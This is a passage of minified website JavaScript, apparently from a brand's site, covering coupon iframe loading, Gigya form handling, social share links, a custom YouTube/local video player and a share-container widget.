h3").text(),i=slug(a),o=camelize(i);r.data={title:a,slug:i},r.open=function(){t(this).addClass("is-active")},r.close=function(){t(this).removeClass("is-active")},n.slidesCount++,n.slides[o]||(n.slides[o]=r)})),n.openAll=function(){a.addClass("is-active")},n.closeAll=function(){a.removeClass("is-active")},r.removeClass((function(t,e){return(e.match(/idclass\-([^\s]+)/gi)||[]).join(" ")}))}catch(t){}})),e()})),t(window).on("hashchange",e)}(Cog.jQuery()),function(t){t(document).ready((function(e){t(window).on("resize",(function(e){t("[class*='fullbox-d'],[class*='fullbox-m']").each((function(e,n){var r=t(n),a="".concat(r.find(".fullbox").get(0).scrollHeight,"px");r.css({"min-height":a})}))})).trigger("resize")}))}(Cog.jQuery()),function(t){window.revTraxBasURL="//irxcm.com/RevTrax/js/rtxiframe.jsp",window.rtRegContainers={},window.revTraxCoupon=function(e,n){if("object"===g(e)||e.hasOwnProperty("programId")){var r=arguments.length>1&&"string"==typeof n&&""!==n?"&uid=".concat(n,"&gigyaID=").concat(n):"",a=e,i="".concat(window.revTraxBasURL,"?parent=").concat(a.parent,"&frameId=").concat(a.frameId,"&rtxuseqs=true&merchantId=").concat(a.merchantId,"&programId=").concat(a.programId,"&affiliateId=").concat(a.affiliateid,"&channel=").concat(a.channel,"&rx_channel=").concat(a.rxChannel).concat(r),o=function(e,n){t.getScript(i,(function(t,r,a){"function"==typeof window[e.createFrameCallback]?(window[e.createFrameCallback](),n&&window.removeRegForm()):console.warn("window.".concat(e.createFrameCallback," doesn't exist!"))}))};o(a,n)}else console.warn("Invalid rtCouponSetupObject")},window.removeRegForm=function(){t(".gigyaraas.component").remove()},t(document).ready((function(e){var n=window.localStorage.getItem("gygiaUID");t(".revtrax-container").each((function(e,r){var a=t(r),i=a.attr("id"),o={frameId:e,createFrameCallback:"makeFrame".concat(e),affiliateid:a.attr("data-affiliate-id"),programId:a.attr("data-program-id"),registrationNeeded:"true"===a.attr("data-reg"),rxChannel:a.attr("data-rx-channel"),channel:a.attr("data-channel"),parent:i,merchantId:a.attr("data-merchant-id")};window.rtRegContainers.hasOwnProperty(i)?console.warn("BP RevTrax Container Duplicate ID: ".concat(i,". Please specify unique ID!")):o.registrationNeeded&&null===n?window.rtRegContainers[i]=o:(null!==n&&window.removeRegForm(),window.revTraxCoupon(o,n))}))}))}(Cog.jQuery()),function(t){var e=".gigya-composite-control-dropdown",n="dropdown-opened-js";t(document).ready((function(){t("body").on("click",(function(r){var a=t(r.target);a.is("".concat(e,", ").concat(e," *:not(select)"))&&r.preventDefault(),a.is("".concat(e," select:not(option)"))&&(a=a.closest(e),t(e).is(".".concat(n))?a.removeClass(n):a.addClass(n)),t(e).not(a).removeClass(n)})),t().on("click",(function(r){var a=t(r.target);a.is("".concat(e," select"))&&t(e).not(a).removeClass(n)})),t("body").on("click",(function(e){var n,r=t(e.target);r.is('#ciam-pch-unsubscribe input[type="checkbox"]:not([data-gigya-name])')?(n=r.closest("#ciam-pch-unsubscribe"),r.is(":checked")&&n.find('input[type="checkbox"][data-gigya-name]').prop({checked:!1})):r.is('#ciam-pch-unsubscribe input[type="checkbox"][data-gigya-name]')&&(n=r.closest("#ciam-pch-unsubscribe")).find('input[type="checkbox"]:not([data-gigya-name])').prop({checked:!1})}))}))}(Cog.jQuery()),function(t){function e(t){navigator.clipboard?navigator.clipboard.writeText(t).then((function(){console.log("Async: Copying to clipboard was successful!")}),(function(t){console.error("Async: Could not copy text: ",t)})):function(t){var e=document.createElement("textarea");e.value=t,document.body.appendChild(e),e.focus(),e.select();try{var n=document.execCommand("copy")?"successful":"unsuccessful";console.log("Fallback: Copying text command was "+n)}catch(t){console.error("Fallback: Oops, unable to copy",t)}document.body.removeChild(e)}(t)}var n=!1;(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|ipad|iris|kindle|Android|Silk|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(navigator.userAgent)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(navigator.userAgent.substr(0,4)))&&(n=!0);var r={share_uri:"shareUrl",fb_app_id:"fbAppId",origin:"origin",share_title:"shareTitle",share_description:"shareDescription",hashtags:"hashTags"},a={facebook:{app:"https://www.facebook.com/sharer.php?u={{share_uri}}",url:"https://www.facebook.com/sharer.php?u={{share_uri}}"},digg:{app:"http://digg.com/submit?url={{share_uri}}&title={{share_title}}",url:"http://digg.com/submit?url={{share_uri}}&title={{share_title}}"},tumblr:{app:"https://www.tumblr.com/widgets/share/tool?canonicalUrl={{share_uri}}&title={{share_title}}&caption={{share_description}}",url:"https://www.tumblr.com/widgets/share/tool?canonicalUrl={{share_uri}}&title={{share_title}}&caption={{share_description}}"},reddit:{app:"https://reddit.com/submit?url={{share_uri}}&title={{share_title}}",url:"https://reddit.com/submit?url={{share_uri}}&title={{share_title}}"},evernote:{app:"http://www.evernote.com/clip.action?url={{share_uri}}",url:"http://www.evernote.com/clip.action?url={{share_uri}}"},flipboard:{app:"https://share.flipboard.com/bookmarklet/popout?v=2&title={{share_title}}&url={{share_uri}}",url:"https://share.flipboard.com/bookmarklet/popout?v=2&title={{share_title}}&url={{share_uri}}"},skype:{app:"https://web.skype.com/share?url={{share_uri}}",url:"https://web.skype.com/share?url={{share_uri}}"},vkontakte:{app:"http://vk.com/share.php?url={{share_uri}}",url:"http://vk.com/share.php?url={{share_uri}}"},okru:{app:"https://connect.ok.ru/dk?st.cmd=WidgetSharePreview&st.shareUrl={{share_uri}}&title={{share_title}}",url:"https://connect.ok.ru/dk?st.cmd=WidgetSharePreview&st.shareUrl={{share_uri}}&title={{share_title}}"},baidu:{app:"http://cang.baidu.com/do/add?it={{share_title}}&iu={{share_uri}}",url:"http://cang.baidu.com/do/add?it={{share_title}}&iu={{share_uri}}"},qzone:{app:"http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url={{share_uri}}",url:"http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url={{share_uri}}"},xing:{app:"https://www.xing.com/app/user?op=share&url={{share_uri}}",url:"https://www.xing.com/app/user?op=share&url={{share_uri}}"},weibo:{app:"http://service.weibo.com/share/share.php?url={{share_uri}}&title={{share_title}}",url:"http://service.weibo.com/share/share.php?url={{share_uri}}&title={{share_title}}"},viber:{app:"viber://forward?text={{share_title}}",url:null},douban:{app:"http://www.douban.com/recommend/?url={{share_uri}}&title={{share_title}}",url:"http://www.douban.com/recommend/?url={{share_uri}}&title={{share_title}}"},delicious:{app:"https://delicious.com/save?v=5&provider=%7Bprovider%7D&noui&jump=close&url={{share_uri}}&title={{share_title}}",url:"https://delicious.com/save?v=5&provider=%7Bprovider%7D&noui&jump=close&url={{share_uri}}&title={{share_title}}"},stumbleupon:{app:"http://www.stumbleupon.com/submit?url={{share_uri}}&title={{share_title}}",url:"http://www.stumbleupon.com/submit?url={{share_uri}}&title={{share_title}}"},linkedin:{app:"https://www.linkedin.com/shareArticle?mini=true&url={{share_uri}}&title={{share_title}}&summary={{share_description}}&source={{share_uri}}",url:"https://www.linkedin.com/shareArticle?mini=true&url={{share_uri}}&title={{share_title}}&summary={{share_description}}&source={{share_uri}}"},messenger:{app:"fb-messenger://share/?link={{share_uri}}&app_id={{fb_app_id}}&redirect_uri={{origin}}",url:"https://www.facebook.com/dialog/send?link={{share_uri}}&app_id={{fb_app_id}}&redirect_uri={{origin}}"},whatsapp:{app:"whatsapp://send?text={{share_title}} {{share_uri}}",url:"https://wa.me/?text={{share_title}} {{share_uri}}"},email:{app:"mailto:?subject={{share_title}}&body={{share_description}}: {{share_uri}}",url:"mailto:?subject={{share_title}}&body={{share_description}}: {{share_uri}}"},twitter:{app:"twitter://post?url={{share_uri}}&text={{share_title}}&hashtags={{hashtags}}",url:"https://twitter.com/share?url={{share_uri}}&text={{share_title}}&hashtags={{hashtags}}"},pinterest:{app:"http://pinterest.com/pin/create/button/?url={{share_uri}}&media=&description={{share_title}}%3A%20{{share_description}}",url:"http://pinterest.com/pin/create/button/?url={{share_uri}}&media=&description={{share_title}}%3A%20{{share_description}}"},copy:{app:"{{share_uri}}",url:"{{share_uri}}"},custom:{app:"custom",url:"custom"}};t("body").on("click",(function(i){var o=t(i.target);o.is("".concat(".jv-share-link",", ").concat(".jv-share-link"," *"))&&(i.preventDefault(),function(i){if(i&&!(!i instanceof t)&&a.hasOwnProperty(i.attr("data-service").toLowerCase())){var o=n?"app":"url",s=i.attr("data-service").toLowerCase(),c={fbAppId:i.attr("data-fbapp-id"),shareUrl:window.location.href,origin:window.location.origin,shareTitle:t('meta[property="og:title"]').attr("content"),shareDescription:t('meta[property="og:description"]').attr("content"),hashTags:t('meta[property="og:title"]').attr("content").split(" ").join(",")},l=a[s][o];if("custom"===l&&i.attr("data-custom-pattern-url"))l=i.attr("data-custom-pattern-url");else if("custom"===l&&!i.attr("data-custom-pattern-url"))return void console.warn("JV Sharer::Missing custom url:data-custom-pattern-url");if(null!==l){for(var u in r)if(r.hasOwnProperty(u)){var d=new RegExp("{{".concat(u,"}}"),"g");l=l.replace(d,"copy"===s?c[r[u]]:encodeURIComponent(c[r[u]]))}if("copy"===s)return e(l),void alert(i.attr("data-copied"));n?window.location.href=l:window.open(l,"","menubar=yes,location=no,resizable=yes,scrollbars=yes,status=yes,top=0,left=0,width=640,height=480")}else alert("This url cannot be shared on this device")}}(o=o.closest(".jv-share-link")))}))}(Cog.jQuery());n(111),n(114);function y(t){return(y="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t})(t)}!function(t){!function(t){var e=t(window);t.fn.visible=function(t,n,r){if(!(this.length<1)){var a=this.length>1?this.eq(0):this,i=a.get(0),o=e.width(),s=e.height(),c=c||"both",l=!0!==n||i.offsetWidth*i.offsetHeight;if("function"==typeof i.getBoundingClientRect){var u=i.getBoundingClientRect(),d=u.top>=0&&u.top<s,f=u.bottom>0&&u.bottom<=s,h=u.left>=0&&u.left<o,p=u.right>0&&u.right<=o,m=t?d||f:d&&f,v=t?h||p:h&&p;if("both"===c)return l&&m&&v;if("vertical"===c)return l&&m;if("horizontal"===c)return l&&v}else{var g=e.scrollTop(),y=g+s,b=e.scrollLeft(),w=b+o,C=a.offset(),k=C.top,S=k+a.height(),x=C.left,T=x+a.width(),O=!0===t?S:k,j=!0===t?k:S,E=!0===t?T:x,M=!0===t?x:T;if("both"===c)return!!l&&y>=j&&O>=g&&w>=M&&E>=b;if("vertical"===c)return!!l&&y>=j&&O>=g;if("horizontal"===c)return!!l&&w>=M&&E>=b}}}}(t);var e=/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),n={simple:'\n      <div class="controls">\n          <div class="icon {{iconPosition}}" style="background-image:url(\'{{icon}}\')">{{iconLink}}</div>\n          <div class="top">\n              <div class="title">{{title}}</div>\n          </div>\n          <div class="bottom">\n              <div class="play-controls" data-play-status="stopped">\n                  <div class="play">\n                      <div class="btn control-btn" role="button" tabindex="1" title="Play" aria-label="Play"></div>\n                  </div>\n              </div>\n              <div class="timeline-controls">\n                  <div class="bar">\n                      <div class="loaded"></div>\n                      <div class="played"></div>\n                      <div class="seektime">00:00:00</div>\n                  </div>\n                  <div class="player-time">\n                      <div class="player-played">00:00:00</div>\n                      <div class="player-total">00:00:00</div>\n                  </div>\n              </div>\n              <div class="settings-controls">\n                  <div class="volume">\n                      <div class="volume-handle">\n                          <div class="vbar">\n                              <div class="vol"></div>\n                          </div>\n                      </div>\n                      <div class="btn control-volume">\n                          <div class="handle"></div>\n                      </div>\n                  </div>\n                  <div class="fullscreen" data-fs-status="n">\n                      <div class="btn control-fullscreen" role="button" tabindex="2" title="Togggle fullscreen" aria-label="Toggle fullscreen">\n                          <div class="i"></div>\n                          <div class="i"></div>\n                          <div class="i"></div>\n                          <div class="i"></div>\n                      </div>\n                  </div>\n              </div>\n          </div>\n      </div>\n  '};Number.prototype.toHHMMSS=function(){var t=Math.floor(this/3600),e=Math.floor((this-3600*t)/60),n=this-3600*t-60*e;return t<10&&(t="0"+t),e<10&&(e="0"+e),n<10&&(n="0"+n),t+":"+e+":"+n},Element.prototype.addLocalPlayer=function(e){if(e&&"object"===y(e)||console.warn("LocalPlayer: no data provided"),!this.localPlayer){var n=document.createElement("video");return e.playerlets.controls,n.setAttribute("src",e.videoId),e.width=e.width?"".concat(e.width,"px"):"100%",e.height=e.height?"".concat(e.height,"px"):"auto",n.style.cssText="\n      width: ".concat(e.width,"\n      height: ").concat(e.height,"\n  "),this.localPlayer={video:this.appendChild(n),data:e,initiated:!1,onPlayerReady:"function"==typeof e.onPlayerReady?e.onPlayerReady:function(){},onStateChange:"function"==typeof e.onStateChange?e.onStateChange:function(){}},n.onloadeddata=function(){n.addEventListener("progress",(function(){try{for(var t=0,e=this.buffered,n=this.currentTime;!(e.start(t)<=n&&n<=e.end(t));)t+=1;this.loadStartPercentage=e.start(t)/this.duration,this.loadEndPercentage=e.end(t)/this.duration,this.loadPercentage=this.loadEndPercentage-this.loadStartPercentage}catch(t){}}));var e=t(this).closest(".bpplayer"),r=Math.round(n.duration);e.find(".player-total").text(r.toHHMMSS()),e.find(".player-played").text("00:00:00")},this}console.warn("LocalPlayer: There is already one instance of LocalPlayer.")},window.bpComponents.bpVideoPlayers={};var r=!1,a=function(e){var n=t(e),r=e.playerData,a="local"===r.type,i=n.find(".player-played"),o=n.find(".player-total"),s=n.find(".loaded"),c=n.find(".played"),l=a?r.video.currentTime:e.player.getCurrentTime(),u=a?r.video.duration:e.player.getDuration(),d=Math.round(l).toHHMMSS(),f=Math.round(u).toHHMMSS(),h=l/u*100,p=a?(100*r.video.loadPercentage).toFixed(2):(100*e.player.getVideoLoadedFraction()).toFixed(2);s.css("width","".concat(p,"%")),c.css("width","".concat(h,"%")),i.text(d),o.text(f)};window.onYouTubeIframeAPIReady=function(){for(i in window.bpComponents.bpVideoPlayers)if(window.bpComponents.bpVideoPlayers.hasOwnProperty(i)){var e=window.bpComponents.bpVideoPlayers[i],n=t(e);"youtube"===e.playerData.type&&(e.player=new YT.Player(e.playerData.playerId+"yt",{height:n.height(),width:n.width(),videoId:e.playerData.videoId,playerlets:{controls:0,rel:0,modestbranding:0,showinfo:0},events:{onReady:e.onPlayerReady,onStateChange:e.onPlayerStateChange}}))}},t(document).ready((function(i){var o;t(window).on("orientationchange",(function(n){if(e&&t(".bpplayer:visible").visible()&&90===window.orientation){var r=!1;t(".bpplayer:visible").each((function(e,n){t(n).visible()&&!r&&(n.fullScreen(),t(n).addClass("autofs"),setTimeout((function(){n.playVideo()}),10),r=!0)}))}if(e&&0===window.orientation){var a=t(".autofs");a.length>0&&a.get(0).exitFullScreen()}})),o="descriptor".concat((new Date).getTime()),t('<p id="'.concat(o,'" aria-hidden>').concat("BP Player. Playes local or youtube videos. Spacebar plays or pauses video on active player. Key up or key down adjusts volume. Key left and key right sets current playhead. Alt key + Enter key toggles fullscreen mode. Escape in fullscreenmode exits the fullscreen mode.","</p>")).hide().appendTo(t("body")),t(".bpplayer").each((function(e,r){var i=t(r),s=i.closest(".advancedParametrizedHtml, .parametrizedhtml"),c=i.attr("data-settings"),l="youtube"===(c=JSON.parse(c.replace(/'/gi,'"'))).type,u="local"===c.type,d=(c.type,s.attr("class").match(/idclass\-([^\s]+)/gi)),f=null===d?"player".concat((new Date).getTime()):camelize(d[0].replace("idclass-",""));c.playerId=f,i.attr("id",c.playerId),window.bpComponents.bpVideoPlayers[i.get(0).id]=i.get(0),r.playerData=c,i.removeAttr("data-settings"),i.attr({"aria-describedby":o}),i.append(t('\n    <div class="placeholder"><img src="'.concat(c.placeholderImage,'"></div>\n  ')));var h=t('\n    <div class="videocontent" id="'.concat(c.playerId,'yt"></div>\n  ')).appendTo(i);r.stopVideo=function(){clearInterval(r.timeline);var e=r.playerData.video;if(l)r.player.stopVideo();else{if(!u)return;e.pause(),e.currentTime=0}r.playing=!1,r.status="stopped",t(r).attr("data-status","stopped").find("[data-play-status]").attr("data-play-status","stopped")},r.playVideo=function(){var e=t(".bpplayer.active"),n=r.playerData.video;if(e.length>0&&!t(r).is(e)&&e.get(0).stopVideo(),l)r.player.playVideo();else{if(!u)return;n.play()}r.playing=!0,r.status="playing",t(r).attr("data-status","playing").find(".controls").removeClass("controls-active-f"),t(r).find("[data-play-status]").attr("data-play-status","playing"),r.timeline=setInterval(a,1,r)},r.pauseVideo=function(){var e=r.playerData.video;if(clearInterval(r.timeline),l)r.player.pauseVideo();else{if(!u)return;e.pause()}r.playing=!r.playing,r.status=r.playing?"playing":"paused",t(r).attr("data-status","paused").find(".controls"),t(r).find("[data-play-status]").attr("data-play-status","paused")},r.onPlayerReady=function(e){r.playing=!1;var n=r.player.getDuration(),a=r.player.getVideoData();t(r).find(".top .title").text(" "===r.playerData.title?a.title:r.playerData.title),t(r).find(".player-total").text(n.toHHMMSS()),r.setVolume(r.playerData.defaultVolume),r.status="stopped",t(r).attr("data-status","stopped").find("[data-play-status]").attr("data-play-status","stopped")},r.fullScreen=function(){try{r.requestFullscreen?r.requestFullscreen():r.mozRequestFullScreen?r.mozRequestFullScreen():r.webkitRequestFullscreen?r.webkitRequestFullscreen():r.msRequestFullscreen&&r.msRequestFullscreen(),t(r).addClass("fs").find(".fullscreen").attr("data-fs-status","fs")}catch(t){}},r.setVolume=function(e,n){var a=t(r);n&&(a.find(".controls").addClass("controls-active"),a.find(".volume").addClass("opened"),window.hider&&clearTimeout(window.hider),window.hider=setTimeout((function(){a.find(".volume.opened").removeClass("opened"),a.find(".controls.controls-active").removeClass("controls-active")}),2e3));var i="local"===r.playerData.type;e>0&&e<=100?(i||(r.player.setVolume(e),r.player.unMute()),i&&(r.playerData.video.volume=e/100,r.playerData.video.muted=!1),t(r).find(".volume").removeClass("muted"),t(r).find(".vol").height("".concat(e,"%")),t(r).find(".control-volume .handle").width("".concat(e,"%"))):0===e&&(i||r.player.mute(),i&&(r.playerData.video.muted=!0),t(r).find(".volume").addClass("muted"))},r.toggleMute=function(){var e=t(r).find(".volume"),n="local"===r.playerData.type;n||(r.player.isMuted()?(r.player.unMute(),e.removeClass("muted")):(r.player.mute(),e.addClass("muted"))),n&&(r.playerData.video.muted?(r.playerData.video.muted=!1,e.removeClass("muted")):(r.playerData.video.muted=!0,e.addClass("muted")))},r.seekToPercentage=function(e,n){e<0&&(e=0),e>100&&(e=100);var a=t(r),i=a.find(".controls"),o=!1,s="local"===r.playerData.type,c=a.find(".seektime"),l=a.attr("data-status"),u=s?r.playerData.video.duration:r.player.getDuration(),d=Math.floor(u*e);c.css("left","calc(".concat(100*e,"% - 30px)")).text(d.toHHMMSS()),n&&(i.addClass("controls-active"),window.hider&&clearTimeout(window.hider),window.hider=setTimeout((function(){t(".volume.opened").removeClass("opened"),i.removeClass("controls-active")}),2e3)),(!s&&[-1,0,2,3,5].indexOf(r.player.getPlayerState())>-1||s&&("stopped"===l||"paused"===l||void 0===l))&&(o=!0),s||r.player.seekTo(d,!0),s&&(r.playerData.video.currentTime=d),o&&r.playVideo()},r.exitFullScreen=function(){try{document.exitFullscreen?document.exitFullscreen():document.mozCancelFullScreen?document.mozCancelFullScreen():document.webkitExitFullscreen?document.webkitExitFullscreen():document.msExitFullscreen&&document.msExitFullscreen(),t(r).removeClass("fs autofs").find(".fullscreen").attr("data-fs-status","n")}catch(t){}},r.onPlayerStateChange=function(e){var n=t(r);if(-1===e.data){var a=r.player.getDuration();n.find(".player-total").text(a.toHHMMSS()),n.find(".player-played").text("00:00:00")}e.data,YT.PlayerState.PLAYING,e.data,YT.PlayerState.BUFFERING},r.hideControls=function(e){var n=t(r);n.find(".top:hover, .bottom:hover").length<1?n.find(".controls").removeClass("controls-active"):n.get(0).hideTimeout=setTimeout(n.get(0).hideControls,2e3)},r.showControls=function(e){t(r).find(".controls").addClass("controls-active")},i.append(n[c.player].replace("{{title}}",c.title).replace("{{icon}}",c.icon.src).replace("{{iconPosition}}",c.iconPosition).replace("{{iconLink}}",""===c.icon.link||void 0===c.icon.link?"":'<a href="'.concat(c.icon.link,'" target="_blank"></a>'))),"local"===c.type&&(r.playerData.video=h.get(0).addLocalPlayer({videoId:r.playerData.videoUrl&&""!==r.playerData.videoUrl&&"$videoUrl"!==r.playerData.videoUrl?r.playerData.videoUrl:r.playerData.videoId,playerlets:{controls:r.playerData.controls,rel:0,modestbranding:0,showinfo:0},events:{onReady:r.onPlayerReady,onStateChange:r.onPlayerStateChange}}).localPlayer.video)}));var s=document.createElement("script"),c=document.getElementsByTagName("script")[0];s.src="https://www.youtube.com/iframe_api",c.parentNode.insertBefore(s,c),t("body").on("mouseover",(function(e){var n,r=t(e.target);if(r.is(".bpplayer *")){(n=r.closest(".bpplayer")).get(0).showControls(e);try{clearTimeout(n.get(0).hideTimeout)}catch(t){}n.get(0).hideTimeout=setTimeout(n.get(0).hideControls,2e3)}})).on("mousemove",(function(e){var n,r=t(e.target);if(r.is(".window.bpComponents.bpVideoPlayers, .bpplayer *")){n=r.closest(".bpplayer");try{clearTimeout(n.get(0).hideTimeout)}catch(t){}n.get(0).showControls(),n.get(0).hideTimeout=setTimeout(n.get(0).hideControls,2e3)}if(r.is(".bpplayer .bar, .bpplayer .bar *")){var a=(n=r.closest(".bpplayer")).get(0),i=n.find(".bar"),o="local"===a.playerData.type,s=n.find(".seektime"),c=i.offset().left,l=o?a.playerData.video.duration:a.player.getDuration(),u=(e.pageX-c)/i.width(),d=Math.floor(l*u);s.css("left","calc(".concat(100*u,"% - 30px)")).text(d.toHHMMSS())}if(r.is(".bpplayer .vbar, .bpplayer .vbar *")&&r.closest(".bpplayer").length>0&&!0===r.closest(".bpplayer").get(0).mousedown){var f=r.closest(".vbar"),h=f.closest(".bpplayer").get(0),p=f.offset().top+f.height()-e.pageY,m=Math.floor(p/f.height()*100);h.setVolume(m)}})).on("keydown",(function(e){try{var n,a=32===e.keyCode,i=39===e.keyCode,o=37===e.keyCode,s=38===e.keyCode,c=40===e.keyCode,l=t(".bpplayer.active"),u=t(document.activeElement).is(".bpplayer, .bpplayer *"),d=l.get(0),f="local"===d.playerData.type,h=(l.find(".vbar"),f?100*d.playerData.video.volume:d.player.getVolume()),p=t(e.target),m=h/10%1>0?0:10;if(1!==e.location&&"AltLeft"!==e.code||18!==e.keyCode||(r=!0),r&&13===e.keyCode)t(".bpplayer.active").trigger("dblclick");if(!a||p.is("input,form,textarea")||"playing"!==l.get(0).status&&"paused"!==l.get(0).status||1!==l.length||u&&(e.preventDefault(),t(".bpplayer.active .play").trigger("click")),s&&h<=100&&u&&(e.preventDefault(),h=(n=10*Math.ceil(h/10)+m)<100?n:100,d.setVolume(h,!0)),c&&h>=0&&u&&(e.preventDefault(),h=(n=10*Math.floor(h/10)-m)>=0?n:0,d.setVolume(h,!0)),(o||i)&&u){e.preventDefault();var v=l.find(".bar"),g=v.find(".played"),y=v.width(),b=g.width()/y+(o?-.05:.05);d.seekToPercentage(b,!0)}}catch(t){}})).on("click keyup",(function(n){try{if(9===n.keyCode)return;r=!1;var a,i=t(n.target);if(i.is(".bpplayer .bar, .bpplayer .bar *")){var o=(a=i.closest(".bpplayer")).find(".bar"),s=o.offset().left,c=(n.pageX-s)/o.width();a.get(0).seekToPercentage(c)}if(i.is(".bpplayer .fullscreen .btn, .bpplayer .fullscreen .btn *")&&(a=i.closest(".bpplayer")).trigger("dblclick"),i.is(".bpplayer .volume, .bpplayer .control-volume, .bpplayer .control-volume *"))(a=i.closest(".bpplayer")).get(0).toggleMute();if(i.is(".bpplayer .play,.bpplayer .play *, .bpplayer .controls")){var l=(a=i.closest(".bpplayer")).get(0),u=(a.find(".bar"),a.find(".controls"));if(l.playing&&!e||e&&l.playing&&a.is(".ca")||e&&l.playing&&u.is(".controls-active, .controls-active-f")?l.pauseVideo():(!l.playing&&!e||e&&!l.playing&&a.is(".ca")||e&&!l.playing&&u.is(".controls-active, .controls-active-f"))&&l.playVideo(),e){a.addClass("ca");try{l.caTimeout&&clearInterval(l.caTimeout),l.caTimeout=setTimeout((function(){a.removeClass("ca")}),2e3)}catch(t){}}t(".bpplayer.active").removeClass("active"),a.addClass("active")}if(i.is(".bpplayer .vbar, .bpplayer .vbar *")){var d=i.closest(".vbar");a=d.closest(".bpplayer"),el=a.get(0);var f=d.offset().top+d.height()-n.pageY,h=Math.floor(f/d.height()*100);el.setVolume(h)}}catch(t){}})).on("dblclick",(function(e){try{var n=t(e.target);if(n.is(".bpplayer,.bpplayer *")){var r=n.closest(".bpplayer").get(0);window.innerHeight==screen.height?r.exitFullScreen():r.fullScreen()}}catch(t){}})).on("fullscreenchange webkitfullscreenchange mozfullscreenchange msfullscreenchange",(function(e){try{document.fullscreenElement||document.webkitFullscreenElement||document.mozFullscreenElement||document.msFullscreenElement||t(".bpplayer").removeClass("fs").find(".fullscreen").attr("data-fs-status","n")}catch(t){}})).on("mousedown",(function(e){try{var n=t(e.target);if(n.is(".bpplayer .vbar"))n.closest(".bpplayer").get(0).mousedown=!0}catch(t){}})).on("mouseup",(function(e){try{t(e.target);t(".bpplayer.active .vbar").length>0&&(t(".bpplayer.active").get(0).mousedown=!1)}catch(t){}})).on("mouseleave",(function(e){try{var n=t(e.target);n.is(".bpplayer .vbar")&&(n.closest(".bpplayer").get(0).mousedown=!1)}catch(t){}}))}))}(Cog.jQuery()),function(t){window.bpComponents.bpShareContainers=t([]),function(){try{return window.self!==window.top}catch(t){return!0}}()||t(document).ready((function(e){var n=t(".bp-share-contains .jv-share-link");t("body").on("click",(function(e){var n=t(e.target);n.is(".bp-share-container, .bp-share-container *")||t(".bp-share-container").addClass("closed").find(".bp-share-container-content").removeClass("content-visible").addClass("content-hidden"),n.is(".bp-share-container-content-close")&&(e.preventDefault(),n.closest(".bp-share-container-content.content-visible").removeClass("content-visible").addClass("content-hidden"),setTimeout((function(){n.closest(".bp-share-container").addClass("closed")}),300))})).on("keyup",(function(e){27===e.keyCode&&(t(".bp-share-container-content.content-visible").removeClass("content-visible").addClass("content-hidden"),t(".bp-share-container").addClass("closed"))})),t(".bp-share-container").each((function(e,r){var a=t(r),i=a.find(".bp-share-container-content"),o=a.attr("data-settings");o=JSON.parse(o.replace(/'/gi,'"')),i.addClass("content-hidden").append(n),a.attr({"data-display-mobile":o.displayTypeMobile,"data-display-desktop":o.displayTypeDesktop,"data-position-mobile":o.positionMobile,"data-position-desktop":o.positionDesktop,"data-animation":o.animation}).removeAttr("data-settings").addClass("closed"),t("body").on(o.trigger,(function(e){var n=t(e.target);if(n.is(".bp-share-container:not(.closed), .bp-share-container:not(.closed) *"))return e.preventDefault(),i.addClass("content-hidden").removeClass("content-visible"),void a.toggleClass("closed");n.is(".bp-share-container.closed, .bp-share-container.closed 